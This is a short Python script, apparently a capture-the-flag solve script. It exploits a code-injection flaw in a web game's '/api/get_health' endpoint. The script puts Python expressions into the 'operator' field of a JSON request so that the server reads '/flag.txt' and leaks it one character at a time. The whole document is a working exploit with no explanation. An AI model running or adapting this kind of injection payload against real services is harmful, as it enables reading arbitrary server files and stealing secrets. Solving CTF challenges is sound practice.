import requests

URL = "insert URL"
s = requests.Session()

r = s.get(URL)
def get_char(i):
    payload = {
        "current_health": "0",
        "attack_power": "0",
        "operator": "+ ord(open('/flag.txt', 'r').read()[{}]) +".format(i)
    }
    r=s.post(URL + "/api/get_health", json=payload)
    return r.json()["message"]
i = 0
while True:
    try:
        c=get_char(i)
        print(chr(c), end="")
        i +=1
    except:
        break
